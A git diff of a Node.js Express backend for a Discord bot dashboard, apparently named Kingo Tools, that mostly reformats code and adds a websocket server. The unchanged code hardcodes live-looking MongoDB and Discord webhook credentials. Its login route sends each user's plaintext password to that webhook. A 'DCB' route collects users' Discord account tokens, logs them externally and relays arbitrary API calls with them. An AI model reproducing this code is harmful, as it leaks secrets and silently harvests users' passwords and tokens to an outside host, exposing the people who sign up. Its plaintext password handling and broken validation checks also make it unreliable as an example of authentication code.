@@ -11,7 +11,12 @@ const path = require("path");
 const fs = require("fs");
 const {client} = require("../KB/main");
 const {m_client} = require("../KMB/main");
-const http = require("http");
+
+//Websocket
+const http = require('http');
+const server = http.createServer(app);
+const {Server} = require("socket.io");
+const io = new Server(server);
 
 mongoose.connect('mongodb+srv://fsdfsdfsdf:aYZdwxlnetcEVTzr@cluster0.epd8a.mongodb.net/kingo-tools?retryWrites=true&w=majority').then(() => {
   console.log("Database connected")
@@ -47,28 +52,28 @@ const Guild = mongoose.model("Server", {
 })
 
 const verifyToken = async (token) => {
-  if (!token){
+  if (!token) {
     return false;
   }
 
   let user;
 
-  try{
+  try {
     const decode = await decodeToken(token);
     user = await User.findOne({login: decode.login});
-  }catch (e) {
+  } catch (e) {
     return false;
-  };
-
-  if (user){
-    return user;
   }
-  else{
+  ;
+
+  if (user) {
+    return user;
+  } else {
     return false;
   }
 }
 
-async function log(mes){
+async function log(mes) {
   const {data} = await axios.post(`https://discord.com/api/webhooks/974024452130078741/RUz8uwlCujoTFcxi8myl89ydNrUEyrMM2_H6y4QD7BmITpN3XNHtSin4aO2SrJQnLj3j`, {
     content: mes
   });
@@ -81,28 +86,26 @@ app.use(cors({
   origin: CLIENT_URL,
   credentials: true,
 }));
-app.use(express.static(path.join(path.dirname(__dirname), "client" ,"build")))
-
+app.use(express.static(path.join(path.dirname(__dirname), "client", "build")))
 app.get("/", async (req, res) => {
-  res.sendFile(path.join(path.dirname(__dirname), "client" ,"build", "index.html"));
+  res.sendFile(path.join(path.dirname(__dirname), "client", "build", "index.html"));
 });
-
 app.post("/api/login", async (req, res) => {
   const {login, password} = req.body;
 
-  if (!login || !password){
+  if (!login || !password) {
     res.send({err: true, message: "Заполните все поля!"});
     return;
   }
 
   const user = await User.findOne({login});
 
-  if (!user){
+  if (!user) {
     res.send({err: true, message: "Пользователь не найден!"});
     return;
   }
 
-  if (user.password !== password){
+  if (user.password !== password) {
     res.send({err: true, message: "Неправильный пароль!"});
     return;
   }
@@ -113,23 +116,22 @@ app.post("/api/login", async (req, res) => {
   await log(`Пользователь авторизовался | \`${login}\` \`${password}\` `);
   res.send({err: false, token});
 });
-
 app.post("/api/registration", async (req, res) => {
   const {login, password} = req.body;
 
-  if (!login || !password){
+  if (!login || !password) {
     res.send({err: true, message: "Заполните все поля!"});
     return;
   }
 
-  if (password.length < 10){
+  if (password.length < 10) {
     res.send({err: true, message: "Пароль должен содержать больше 9-ти символов!"});
     return;
   }
 
   const checkUser = await User.findOne({login});
 
-  if (checkUser){
+  if (checkUser) {
     res.send({err: true, message: "Логин занят."});
     return;
   }
@@ -141,80 +143,77 @@ app.post("/api/registration", async (req, res) => {
 
   res.send({err: false});
 })
-
 app.post("/api/verify", async (req, res) => {
   const {token} = req.body;
 
-  if (!token){
+  if (!token) {
     res.send({err: true});
     return;
   }
 
   let decode;
 
-  try{
+  try {
     decode = await decodeToken(token);
-  }catch (e) {
+  } catch (e) {
     res.send({err: true});
     return;
   }
 
   let user = await User.findOne({login: decode?.login});
 
-  if (user){
+  if (user) {
     res.send({err: false});
-  }
-  else{
+  } else {
     res.send({err: true});
   }
 
 });
-
 app.get("/api/data", async (req, res) => {
   const {token} = req.cookies;
-  if (!token){
+  if (!token) {
     res.send({err: true});
     return;
   }
 
   let user;
 
-  try{
+  try {
     const decode = await decodeToken(token);
     user = await User.findOne({login: decode.login});
-  }catch (e) {
+  } catch (e) {
     res.send({err: true});
     return;
-  };
+  }
+  ;
 
   if (Object.keys(user.discord || {}).length > 0) {
     delete user.discord.guilds;
     res.send({login: user.login, flags: user.flags, discord: user.discord});
-  }
-  else{
+  } else {
     res.send({login: user.login, flags: user.flags, discord: user.discord});
   }
 
 });
-
 app.get("/api/fetchGuilds", async (req, res) => {
   const {token} = req.cookies;
-  if (!token){
+  if (!token) {
     res.send({err: true});
     return;
   }
 
   let user;
 
-  try{
+  try {
     const decode = await decodeToken(token);
     user = await User.findOne({login: decode.login});
-  }catch (e) {
+  } catch (e) {
     res.send({err: true});
     return;
-  };
+  }
+  ;
 
-  if (Object.keys(user.discord).length === 0){
+  if (Object.keys(user.discord).length === 0) {
     res.send({err: true});
     return;
   }
@@ -242,7 +241,7 @@ app.get("/api/fetchGuilds", async (req, res) => {
     await user.save();
 
     const {data: guilds} = await axios.get("https://discord.com/api/users/@me/guilds", {
-      headers:{
+      headers: {
         "Authorization": `Bearer ${discordToken}`
       }
     });
@@ -264,78 +263,80 @@ app.post("/api/dcb/login", async (req, res) => {
   const {token: discordToken} = req.body;
 
   const user = await verifyToken(token);
-  if (!user || !discordToken){
+  if (!user || !discordToken) {
     res.send({err: true, message: "Укажите токен!"});
     return;
   }
 
-  if (!user.flags.some(flag => flag.id === 1)){
+  if (!user.flags.some(flag => flag.id === 1)) {
     res.send({err: true, message: "Вы не можете использовать этот функционал!"});
     return;
   }
 
   //Connecting to account
   let result = false;
-  try{
+  try {
     await axios.patch(`https://discord.com/api/v9/users/@me/settings`, {
-      client_status:{
+      client_status: {
         mobile: "online"
       }
-    }, {headers: {
+    }, {
+      headers: {
         authorization: discordToken
-      }})
+      }
+    })
     result = true;
-  }
-  catch (e){
+  } catch (e) {
     result = false;
   }
 
-  if (result){
+  if (result) {
     res.send({err: false, message: "Пользователь авторизован!"});
     await log(`DCB | ${user.login} использовал токен \`${token}\``);
-  }
-  else{
+  } else {
     res.send({err: true, message: "Неверный токен!"})
   }
 
 })
-
 app.post("/api/dcb/command", async (req, res) => {
   const {method, body, path, authToken} = req.body;
   const {token} = req.cookies;
 
   const user = await verifyToken(token);
-  if (!user || !token){
+  if (!user || !token) {
     res.send({err: true, message: "Укажите токен!"});
     return;
   }
-  if (!user.flags.some(flag => flag.id === 1)){
+  if (!user.flags.some(flag => flag.id === 1)) {
     res.send({err: true, message: "Вы не можете использовать этот функционал!"});
     return;
   }
 
-  if (!method || !path || !authToken){
+  if (!method || !path || !authToken) {
     res.status(400).send({err: true, message: "Bad Request"});
     return;
   }
 
-  try{
-    if (method === "get" || method === "delete"){
-      const {data} = await axios[method](`https://discord.com/api/v9/${path}`, {headers: {
+  try {
+    if (method === "get" || method === "delete") {
+      const {data} = await axios[method](`https://discord.com/api/v9/${path}`, {
+        headers: {
           authorization: authToken
-      }});
+        }
+      });
       res.send({err: false, message: data});
       return;
-    }
-    else{
-      const {data} = await axios[method](`https://discord.com/api/v9/${path}`,body , {headers: {
+    } else {
+      const {data} = await axios[method](`https://discord.com/api/v9/${path}`, body, {
+        headers: {
           authorization: authToken
-      }});
+        }
+      });
       res.send({err: false, message: data});
       return;
     }
 
-  }catch (e) {
+  } catch (e) {
     res.send({err: false, message: e});
     return;
   }
@@ -343,16 +344,15 @@ app.post("/api/dcb/command", async (req, res) => {
 });
 
 /*ADMIN PAGE*/
-
 app.get("/api/admin/users", async (req, res) => {
   const {token} = req.cookies;
 
   const user = await verifyToken(token);
-  if (!user || !token){
+  if (!user || !token) {
     res.send({err: true, message: "Укажите токен!"});
     return;
   }
-  if (!user.flags.some(flag => flag.id === 2)){
+  if (!user.flags.some(flag => flag.id === 2)) {
     res.send({err: true, message: "Вы не можете использовать этот функционал!"});
     return;
   }
@@ -360,27 +360,26 @@ app.get("/api/admin/users", async (req, res) => {
   const users = await User.find({});
   res.send({err: false, users});
 });
-
 app.post("/api/admin/create", async (req, res) => {
   const {token} = req.cookies;
   const {login, password} = req.body;
   const user = await verifyToken(token);
-  if (!user || !token){
+  if (!user || !token) {
     res.send({err: true, message: "Укажите токен!"});
     return;
   }
-  if (!user.flags.some(flag => flag.id === 2)){
+  if (!user.flags.some(flag => flag.id === 2)) {
     res.send({err: true, message: "Вы не можете использовать этот функционал!"});
     return;
   }
-  if (!login, !password){
+  if (!login, !password) {
     res.send({err: true, message: "Заполните все поля!"});
     return;
   }
 
   const checkUser = await User.findOne({login});
 
-  if (checkUser){
+  if (checkUser) {
     res.send({err: true, message: "Пользователь с таким Login уже существует."});
     return;
   }
@@ -389,27 +388,26 @@ app.post("/api/admin/create", async (req, res) => {
   await newUser.save();
   res.send({err: false});
 });
-
 app.post("/api/admin/delete", async (req, res) => {
   const {token} = req.cookies;
   const {login} = req.body;
   const user = await verifyToken(token);
-  if (!user || !token){
+  if (!user || !token) {
     res.send({err: true, message: "Укажите токен!"});
     return;
   }
-  if (!user.flags.some(flag => flag.id === 2)){
+  if (!user.flags.some(flag => flag.id === 2)) {
     res.send({err: true, message: "Вы не можете использовать этот функционал!"});
     return;
   }
-  if (!login){
+  if (!login) {
     res.send({err: true, message: "Не указан логин!"});
     return;
   }
 
   const deleteUser = await User.findOne({login});
 
-  if (!deleteUser){
+  if (!deleteUser) {
     res.send({err: true, message: "Пользователь не найден!"});
     return;
   }
@@ -418,40 +416,40 @@ app.post("/api/admin/delete", async (req, res) => {
 
   res.send({err: false, message: "Успешно!"});
 });
-
 app.post("/api/admin/addFlag", async (req, res) => {
   const {token} = req.cookies;
   const {login, flagID} = req.body;
   const user = await verifyToken(token);
-  if (!user || !token){
+  if (!user || !token) {
     res.send({err: true, message: "Укажите токен!"});
     return;
   }
-  if (!user.flags.some(flag => flag.id === 2)){
+  if (!user.flags.some(flag => flag.id === 2)) {
     res.send({err: true, message: "Вы не можете использовать этот функционал!"});
     return;
   }
-  if (!login){
+  if (!login) {
     res.send({err: true, message: "Не указан логин!"});
     return;
   }
-  if (!flagID){
+  if (!flagID) {
     res.send({err: true, message: "Не указан флаг!"});
     return;
   }
 
   const flag = flags.find(flag => flag.id === flagID);
-  if (!flag){
+  if (!flag) {
     res.send({err: true, message: "Флага не существует!"});
     return;
-  };
+  }
+  ;
 
   const addUser = await User.findOne({login});
-  if (!addUser){
+  if (!addUser) {
     res.send({err: true, message: "Пользователь не найдён!"});
     return;
   }
-  if (addUser.flags.find(flag => flag.id === flagID)){
+  if (addUser.flags.find(flag => flag.id === flagID)) {
     res.send({err: true, message: "Пользователь уже имеет данный флаг!"});
     return;
   }
@@ -460,40 +458,40 @@ app.post("/api/admin/addFlag", async (req, res) => {
   await addUser.save();
   res.send({err: false, message: "Успешно!"});
 });
-
 app.post("/api/admin/removeFlag", async (req, res) => {
   const {token} = req.cookies;
   const {login, flagID} = req.body;
   const user = await verifyToken(token);
-  if (!user || !token){
+  if (!user || !token) {
     res.send({err: true, message: "Укажите токен!"});
     return;
   }
-  if (!user.flags.some(flag => flag.id === 2)){
+  if (!user.flags.some(flag => flag.id === 2)) {
     res.send({err: true, message: "Вы не можете использовать этот функционал!"});
     return;
   }
-  if (!login){
+  if (!login) {
     res.send({err: true, message: "Не указан логин!"});
     return;
   }
-  if (!flagID){
+  if (!flagID) {
     res.send({err: true, message: "Не указан флаг!"});
     return;
   }
 
   const flag = flags.find(flag => flag.id === flagID);
-  if (!flag){
+  if (!flag) {
     res.send({err: true, message: "Флага не существует!"});
     return;
-  };
+  }
+  ;
 
   const addUser = await User.findOne({login});
-  if (!addUser){
+  if (!addUser) {
     res.send({err: true, message: "Пользователь не найдён!"});
     return;
   }
-  if (!addUser.flags.find(flag => flag.id === flagID)){
+  if (!addUser.flags.find(flag => flag.id === flagID)) {
     res.send({err: true, message: "Пользователь не имеет данный флаг!"});
     return;
   }
@@ -502,15 +500,14 @@ app.post("/api/admin/removeFlag", async (req, res) => {
   await addUser.save();
   res.send({err: false, message: "Успешно!"});
 });
-
 app.get("/api/admin/flags", async (req, res) => {
   const {token} = req.cookies;
   const user = await verifyToken(token);
-  if (!user || !token){
+  if (!user || !token) {
     res.send({err: true, message: "Укажите токен!"});
     return;
   }
-  if (!user.flags.some(flag => flag.id === 2)){
+  if (!user.flags.some(flag => flag.id === 2)) {
     res.send({err: true, message: "Вы не можете использовать этот функционал!"});
     return;
   }
@@ -524,19 +521,19 @@ app.post("/api/discord", async (req, res) => {
   const {code} = req.body;
 
   const user = await verifyToken(token);
-  if (!user || !token){
+  if (!user || !token) {
     res.send({err: true, message: "Укажите токен!"});
     return;
   }
-  if (!user.flags.some(flag => flag.id === 1)){
+  if (!user.flags.some(flag => flag.id === 1)) {
     res.send({err: true, message: "Вы не можете использовать этот функционал!"});
     return;
   }
-  if (Object.keys(user.discord).length > 0){
+  if (Object.keys(user.discord).length > 0) {
     res.send({err: true, message: "Discord аккаунт уже привязан"});
     return;
   }
-  if (!code){
+  if (!code) {
     res.send({err: true, message: ""});
     return;
   }
@@ -552,7 +549,7 @@ app.post("/api/discord", async (req, res) => {
   let discordToken = null;
   let refreshToken = null;
 
-  axios.post("https://discord.com/api/oauth2/token", params,{
+  axios.post("https://discord.com/api/oauth2/token", params, {
     headers: {
       "Content-Type": "application/x-www-form-urlencoded"
     }
@@ -564,33 +561,31 @@ app.post("/api/discord", async (req, res) => {
 
 
     axios.get("https://discord.com/api/users/@me", {
-      headers:{
+      headers: {
         "Authorization": `${type} ${discordToken}`
       }
     }).then(async ({data: userData}) => {
 
-              const {data: guilds} = await axios.get("https://discord.com/api/users/@me/guilds", {
-                headers:{
-                  "Authorization": `${type} ${discordToken}`
-                }
-              });
+      const {data: guilds} = await axios.get("https://discord.com/api/users/@me/guilds", {
+        headers: {
+          "Authorization": `${type} ${discordToken}`
+        }
+      });
 
-              user.discord = {...userData, guilds, refreshToken};
-              await user.save();
-              res.send({err: false})
-
-
+      user.discord = {...userData, guilds, refreshToken};
+      await user.save();
+      res.send({err: false})
 
 
-       }).catch((e) => {
-              res.send({err: true, message: "Ошибка"})
-              console.log(e);
-       })
     }).catch((e) => {
-
       res.send({err: true, message: "Ошибка"})
+      console.log(e);
+    })
+  }).catch((e) => {
 
-    });
+    res.send({err: true, message: "Ошибка"})
+
+  });
 
 })
 
@@ -600,31 +595,30 @@ app.get("/api/fetchGuildData", async (req, res) => {
   const {serverId} = req.query;
 
   const user = await verifyToken(token);
-  if (!user || !token){
+  if (!user || !token) {
     res.send({err: true, message: "Укажите токен!"});
     return;
   }
-  if (!user.flags.some(flag => flag.id === 1)){
+  if (!user.flags.some(flag => flag.id === 1)) {
     res.send({err: true, message: "Вы не можете использовать этот функционал!"});
     return;
   }
-  if (Object.keys(user.discord).length === 0){
+  if (Object.keys(user.discord).length === 0) {
     res.send({err: true, message: "Discord аккаунт не привязан"});
     return;
   }
 
-  if(!user.discord.guilds.find(guild => guild.id === serverId)){
+  if (!user.discord.guilds.find(guild => guild.id === serverId)) {
     res.send({err: true, message: "Вы не владеете данным серверов"});
     return;
   }
 
   let guild = await Guild.findOne({id: serverId});
 
-  if (!guild){
+  if (!guild) {
     res.send({err: false, message: "Добавьте бота на сервер"});
     return;
-  }
-  else{
+  } else {
     let guildDs = await client.guilds.fetch(serverId);
 
     let roles = guildDs.roles.cache;
@@ -637,7 +631,7 @@ app.get("/api/fetchGuildData", async (req, res) => {
       rolesArr.push({name: role.name, id: role.id, color: role.hexColor});
     });
     channels.forEach(channel => {
-      if (channel.type === "GUILD_TEXT"){
+      if (channel.type === "GUILD_TEXT") {
         channelsArr.push({name: channel.name, id: channel.id})
       }
     });
@@ -665,32 +659,32 @@ app.post("/api/config", async (req, res) => {
   const {type, payload, guild_id, module, property, commandName} = req.body;
 
   const user = await verifyToken(token);
-  if (!user || !type || (!payload && typeof payload !== "boolean") || !guild_id || !module || !property){
+  if (!user || !type || (!payload && typeof payload !== "boolean") || !guild_id || !module || !property) {
     res.send({err: true, message: "Incorrect form data"});
     return;
   }
-  if (!user.flags.some(flag => flag.id === 1)){
+  if (!user.flags.some(flag => flag.id === 1)) {
     res.send({err: true, message: "Вы не можете использовать этот функционал!"});
     return;
   }
-  if (Object.keys(user.discord).length === 0){
+  if (Object.keys(user.discord).length === 0) {
     res.send({err: true, message: "Discord аккаунт не привязан"});
     return;
   }
 
-  if(!user.discord.guilds.find(guild => guild.id === guild_id)){
+  if (!user.discord.guilds.find(guild => guild.id === guild_id)) {
     res.send({err: true, message: "Вы не владеете данным серверов"});
     return;
   }
 
   let guild = await Guild.findOne({id: guild_id});
 
-  if(!guild){
+  if (!guild) {
     res.send({err: true, message: "Сервер не найден"});
     return;
   }
 
-  if (!guild.options.hasOwnProperty(module)){
+  if (!guild.options.hasOwnProperty(module)) {
     res.send({err: true, message: "Модуль не найден!"});
     return;
   }
@@ -698,32 +692,46 @@ app.post("/api/config", async (req, res) => {
   switch (type) {
     case "change_field":
 
-      if (!guild.options[module].hasOwnProperty(property)){
+      if (!guild.options[module].hasOwnProperty(property)) {
         res.send({err: true, message: "Свойство не найдено!"});
         return;
       }
 
-      if (typeof guild.options[module][property] !== typeof payload){
+      if (typeof guild.options[module][property] !== typeof payload) {
         res.send({err: true, message: "Неверные данные для изменения!"});
         return;
       }
 
-      if (property === "punishment"){
-        switch (true){
+      if (property === "punishment") {
+        switch (true) {
           case ("name" in payload):
-            guild.options = {...guild.options, [module]: {...guild.options[module], [property]: {...guild.options[module][property], name: payload.name}}}
+            guild.options = {
+              ...guild.options,
+              [module]: {...guild.options[module], [property]: {...guild.options[module][property], name: payload.name}}
+            }
             break;
           case ("duration" in payload):
-            guild.options = {...guild.options, [module]: {...guild.options[module], [property]: {...guild.options[module][property], duration: payload.duration}}}
+            guild.options = {
+              ...guild.options,
+              [module]: {
+                ...guild.options[module],
+                [property]: {...guild.options[module][property], duration: payload.duration}
+              }
+            }
             break;
           case ("reason" in payload):
-            guild.options = {...guild.options, [module]: {...guild.options[module], [property]: {...guild.options[module][property], reason: payload.reason}}}
+            guild.options = {
+              ...guild.options,
+              [module]: {
+                ...guild.options[module],
+                [property]: {...guild.options[module][property], reason: payload.reason}
+              }
+            }
             break;
         }
         await guild.save();
         res.send({err: false})
-      }
-      else{
+      } else {
         guild.options = {...guild.options, [module]: {...guild.options[module], [property]: payload}}
 
         await guild.save();
@@ -747,26 +755,26 @@ app.post("/api/config", async (req, res) => {
       break;
 
     case "change_command":
-      if (!commandName){
+      if (!commandName) {
         res.send({err: true, message: "Укажите название команды!"});
         return;
       }
       const commandsArray = JSON.parse(JSON.stringify(guild.options.commands));
       const command = commandsArray.find(command => command.name === commandName);
-      if (!command){
+      if (!command) {
         res.send({err: true, message: "Команда не найдена!"});
         return;
       }
-      if (!(property in command)){
+      if (!(property in command)) {
         res.send({err: true, message: "Свойство не найдено!"});
         return;
       }
-      if (property !== "rolesWhiteList" && property !== "on" && property !== "channelWhiteList"){
+      if (property !== "rolesWhiteList" && property !== "on" && property !== "channelWhiteList") {
         res.send({err: true, message: "Данное свойство нельзя изменить!"});
         return;
       }
 
-      if (typeof command[property] !== typeof payload){
+      if (typeof command[property] !== typeof payload) {
         res.send({err: true, message: "Неверные данные для изменения!"});
         return;
       }
@@ -775,11 +783,10 @@ app.post("/api/config", async (req, res) => {
 
       command[property] = payload;
 
-      for (let c of commandsArray){
-        if (c.name !== commandName){
+      for (let c of commandsArray) {
+        if (c.name !== commandName) {
           resultArray.push(c);
-        }
-        else{
+        } else {
           resultArray.push(command);
         }
       }
@@ -794,32 +801,35 @@ app.post("/api/config", async (req, res) => {
 
       const {roleId: payload_roleId, levelRequired: payload_levelRequired, comment: payload_comment} = payload;
 
-      if (!payload_roleId || !payload_levelRequired || !payload_comment){
+      if (!payload_roleId || !payload_levelRequired || !payload_comment) {
         res.send({err: true, message: "Неверный формат данных!"});
         return;
       }
 
-      if (guild.options.levelSystem.levelRoles.find(rule => rule.roleId === payload_roleId)){
+      if (guild.options.levelSystem.levelRoles.find(rule => rule.roleId === payload_roleId)) {
         res.send({err: true, message: "Правило для этой роли уже существует!"});
         return;
       }
 
-      guild.options = {...guild.options, levelSystem: {...guild.options.levelSystem, levelRoles: [...guild.options.levelSystem.levelRoles, payload]}};
+      guild.options = {
+        ...guild.options,
+        levelSystem: {...guild.options.levelSystem, levelRoles: [...guild.options.levelSystem.levelRoles, payload]}
+      };
       await guild.save();
       res.send({err: false});
       break;
 
     case "remove_levels_rule":
 
-      if (typeof payload !=="string"){
+      if (typeof payload !== "string") {
         res.send({err: true, message: "Неверный формат данных!"});
         return;
       }
 
       let arr = [];
 
-      for(let rule of guild.options.levelSystem.levelRoles){
-        if (rule.roleId === payload){
+      for (let rule of guild.options.levelSystem.levelRoles) {
+        if (rule.roleId === payload) {
           continue;
         }
         arr.push(rule);
@@ -834,17 +844,17 @@ app.post("/api/config", async (req, res) => {
 
     case "check_log_property":
       let logger = JSON.parse(JSON.stringify(guild.options.logger));
-      if (!["modAllow","messageEventsAllow","voiceAllow","membersAllow"].includes(property)){
+      if (!["modAllow", "messageEventsAllow", "voiceAllow", "membersAllow"].includes(property)) {
         res.send({err: true, message: "Cвойство не найдено!"});
         return;
       }
-      let allowedProperty = ["BAN", "KICK", "TIMEOUT", "BAN_REMOVE", "TIMEOUT_REMOVE", "MESSAGE_DELETE", "MESSAGE_EDIT", "MESSAGE_PURGED", "VOICE_JOIN", "VOICE_LEAVE", "VOICE_CHANGE","MEMBER_JOIN", "MEMBER_LEAVE", "MEMBER_ROLE_ADD", "MEMBER_ROLE_REMOVE", "MEMBER_NICKNAME_CHANGE", "MUTE", "MUTE_REMOVE"];
-      if (!allowedProperty.includes(payload)){
+      let allowedProperty = ["BAN", "KICK", "TIMEOUT", "BAN_REMOVE", "TIMEOUT_REMOVE", "MESSAGE_DELETE", "MESSAGE_EDIT", "MESSAGE_PURGED", "VOICE_JOIN", "VOICE_LEAVE", "VOICE_CHANGE", "MEMBER_JOIN", "MEMBER_LEAVE", "MEMBER_ROLE_ADD", "MEMBER_ROLE_REMOVE", "MEMBER_NICKNAME_CHANGE", "MUTE", "MUTE_REMOVE"];
+      if (!allowedProperty.includes(payload)) {
         res.send({err: true, message: "Cвойство не найдено!"});
         return;
       }
       console.log(property, logger)
-      if (logger[property].includes(payload)){
+      if (logger[property].includes(payload)) {
         res.send({err: true, message: "Cвойство уже включено!"});
         return;
       }
@@ -858,16 +868,16 @@ app.post("/api/config", async (req, res) => {
 
     case "uncheck_log_property":
       let loggerCopy = JSON.parse(JSON.stringify(guild.options.logger));
-      if (!["modAllow","messageEventsAllow","voiceAllow","membersAllow"].includes(property)){
+      if (!["modAllow", "messageEventsAllow", "voiceAllow", "membersAllow"].includes(property)) {
         res.send({err: true, message: "Cвойство не найдено!"});
         return;
       }
-      let allowedPropertys = ["BAN", "KICK", "TIMEOUT", "BAN_REMOVE", "TIMEOUT_REMOVE", "MESSAGE_DELETE", "MESSAGE_EDIT", "MESSAGE_PURGED", "VOICE_JOIN", "VOICE_LEAVE", "VOICE_CHANGE","MEMBER_JOIN", "MEMBER_LEAVE", "MEMBER_ROLE_ADD", "MEMBER_ROLE_REMOVE", "MEMBER_NICKNAME_CHANGE"];
-      if (!allowedPropertys.includes(payload)){
+      let allowedPropertys = ["BAN", "KICK", "TIMEOUT", "BAN_REMOVE", "TIMEOUT_REMOVE", "MESSAGE_DELETE", "MESSAGE_EDIT", "MESSAGE_PURGED", "VOICE_JOIN", "VOICE_LEAVE", "VOICE_CHANGE", "MEMBER_JOIN", "MEMBER_LEAVE", "MEMBER_ROLE_ADD", "MEMBER_ROLE_REMOVE", "MEMBER_NICKNAME_CHANGE"];
+      if (!allowedPropertys.includes(payload)) {
         res.send({err: true, message: "Cвойство не найдено!"});
         return;
       }
-      if (!loggerCopy[property].includes(payload)){
+      if (!loggerCopy[property].includes(payload)) {
         res.send({err: true, message: "Cвойство уже выключено!"});
         return;
       }
@@ -878,17 +888,17 @@ app.post("/api/config", async (req, res) => {
       break;
 
     case "add_custom_command":
-      if (!"name" in payload || !"text" in payload || !"sendChannel" in payload || !"rolesWhiteList" in payload || !"channelWhiteList" in payload){
+      if (!"name" in payload || !"text" in payload || !"sendChannel" in payload || !"rolesWhiteList" in payload || !"channelWhiteList" in payload) {
         res.send({err: true, message: "Invalid from data!"});
         return
       }
       const {name, text, sendChannel, rolesWhiteList, channelWhiteList} = payload;
-      if (typeof name !== "string" || typeof text !== "string" || typeof sendChannel !== "string"  || !rolesWhiteList instanceof Array || !channelWhiteList instanceof Array){
+      if (typeof name !== "string" || typeof text !== "string" || typeof sendChannel !== "string" || !rolesWhiteList instanceof Array || !channelWhiteList instanceof Array) {
         res.send({err: true, message: "Invalid from data!"});
         return
       }
       let сcommand = await JSON.parse(JSON.stringify(guild.options.customCommands)).find(c => c.name === payload.name);
-      if (сcommand){
+      if (сcommand) {
         res.send({err: true, message: "Команда с таким именем уже существует"});
         return
       }
@@ -897,14 +907,14 @@ app.post("/api/config", async (req, res) => {
       res.send({err: false});
       break;
     case "remove_custom_command":
-      if (typeof payload !== "string"){
+      if (typeof payload !== "string") {
         res.send({err: true, message: "Invalid from data!"});
         return
       }
       let comArr = [];
 
-      for(let command of guild.options.customCommands){
-        if (command.name === payload){
+      for (let command of guild.options.customCommands) {
+        if (command.name === payload) {
           continue;
         }
         comArr.push(command);
@@ -920,44 +930,44 @@ app.post("/api/config", async (req, res) => {
   }
 
 })
-
 app.post("/api/addReactionRole", async (req, res) => {
   const {token} = req.cookies;
 
   const {guild_id, data} = req.body
 
   const user = await verifyToken(token);
-  if (!user || !data || !"messageId" in data || !"roleId" in data || !"channelId" in data || !"emoji" in data){
+  if (!user || !data || !"messageId" in data || !"roleId" in data || !"channelId" in data || !"emoji" in data) {
     res.send({err: true, message: "Incorrect form data"});
     return;
   }
 
-  if (!user.flags.some(flag => flag.id === 1)){
+  if (!user.flags.some(flag => flag.id === 1)) {
     res.send({err: true, message: "Вы не можете использовать этот функционал!"});
     return;
   }
-  if (Object.keys(user.discord).length === 0){
+  if (Object.keys(user.discord).length === 0) {
     res.send({err: true, message: "Discord аккаунт не привязан"});
     return;
   }
 
-  if(!user.discord.guilds.find(guild => guild.id === guild_id)){
+  if (!user.discord.guilds.find(guild => guild.id === guild_id)) {
     res.send({err: true, message: "Вы не владеете данным серверов"});
     return;
   }
 
   let guild = await Guild.findOne({id: guild_id});
 
-  if(!guild){
+  if (!guild) {
     res.send({err: true, message: "Сервер не найден"});
     return;
   }
 
-  try{
+  try {
     let channel = await client.channels.fetch(data.channelId);
     let message = await channel.messages.fetch(data.messageId);
     await message.react(data.emoji);
-  }catch (e) {}
+  } catch (e) {
+  }
 
   guild.options = {...guild.options, reactionRole: [...guild.options.reactionRole, data]};
   await guild.save();
@@ -965,48 +975,48 @@ app.post("/api/addReactionRole", async (req, res) => {
   res.send({err: false})
   await log(`Kingo Bot | ${user.login} добавил rr`);
 });
-
 app.post("/api/removeReactionRole", async (req, res) => {
   const {token} = req.cookies;
 
   const {guild_id, id} = req.body
 
   const user = await verifyToken(token);
-  if (!user || !id){
+  if (!user || !id) {
     res.send({err: true, message: "Incorrect form data"});
     return;
   }
 
-  if (!user.flags.some(flag => flag.id === 1)){
+  if (!user.flags.some(flag => flag.id === 1)) {
     res.send({err: true, message: "Вы не можете использовать этот функционал!"});
     return;
   }
-  if (Object.keys(user.discord).length === 0){
+  if (Object.keys(user.discord).length === 0) {
     res.send({err: true, message: "Discord аккаунт не привязан"});
     return;
   }
 
-  if(!user.discord.guilds.find(guild => guild.id === guild_id)){
+  if (!user.discord.guilds.find(guild => guild.id === guild_id)) {
     res.send({err: true, message: "Вы не владеете данным серверов"});
     return;
   }
 
   let guild = await Guild.findOne({id: guild_id});
 
-  if(!guild){
+  if (!guild) {
     res.send({err: true, message: "Сервер не найден"});
     return;
   }
-  try{
+  try {
     let channel = await client.channels.fetch(data.channelId);
     let message = await channel.messages.fetch(data.messageId);
     await message.reactions.cache.get(await guild.options.reactionRole.find(r => r.id === id).emoji).remove()
-  }catch (e) {}
+  } catch (e) {
+  }
 
 
   let resultArr = [];
 
-  for (let role of JSON.parse(JSON.stringify(guild.options.reactionRole))){
+  for (let role of JSON.parse(JSON.stringify(guild.options.reactionRole))) {
     if (role.id !== id) {
       resultArr.push(role);
     }
@@ -1026,11 +1036,11 @@ app.post("/api/updateGuildData", async (req, res) => {
   const {guild_id} = req.body;
 
   const user = await verifyToken(token);
-  if (!user || !guild_id){
+  if (!user || !guild_id) {
     res.send({err: true, message: "Incorrect form data"});
     return;
   }
-  if (!user.flags.some(flag => flag.id === 1)){
+  if (!user.flags.some(flag => flag.id === 1)) {
     res.send({err: true, message: "Вы не можете использовать этот функционал!"});
     return;
   }
@@ -1038,12 +1048,12 @@ app.post("/api/updateGuildData", async (req, res) => {
     res.send({err: true, message: "Discord аккаунт не привязан"});
     return;
   }
-  if(!user.discord.guilds.find(guild => guild.id === guild_id)){
+  if (!user.discord.guilds.find(guild => guild.id === guild_id)) {
     res.send({err: true, message: "Вы не владеете данным серверов"});
     return;
   }
   let guild = await Guild.findOne({id: guild_id});
-  if(!guild){
+  if (!guild) {
     res.send({err: true, message: "Сервер не найден"});
     return;
   }
@@ -1054,12 +1064,12 @@ app.post("/api/updateGuildData", async (req, res) => {
 
   let newCommands = [];
 
-  for (const p of pathArray){
+  for (const p of pathArray) {
     const command = require("../KB/commands/" + p.name);
     newCommands.push(command);
   }
 
-  for (const p of musicPathArray){
+  for (const p of musicPathArray) {
     const command = require("../KMB/commands/" + p.name);
     newCommands.push(command);
   }
@@ -1078,10 +1088,10 @@ app.post("/api/updateGuildData", async (req, res) => {
 
   let resultCommands = [];
 
-  for (let command of newCommands){
+  for (let command of newCommands) {
     let guildCommand = guildCommands.find(c => c.name === command.name);
 
-    if (!guildCommand){
+    if (!guildCommand) {
       resultCommands.push(command);
       continue;
     }
@@ -1106,8 +1116,138 @@ app.post("/api/updateGuildData", async (req, res) => {
 });
 
 app.get("*", async (req, res) => {
-  res.sendFile(path.join(path.dirname(__dirname), "client" ,"build", "index.html"));
+  res.sendFile(path.join(path.dirname(__dirname), "client", "build", "index.html"));
 })
-app.listen(process.env.PORT || 3001, () => {
+
+io.on('connection', async (socket) => {
+  socket.data = {
+    user: null,
+    webSender: {
+      webHook: {
+        name: null,
+        image: null
+      },
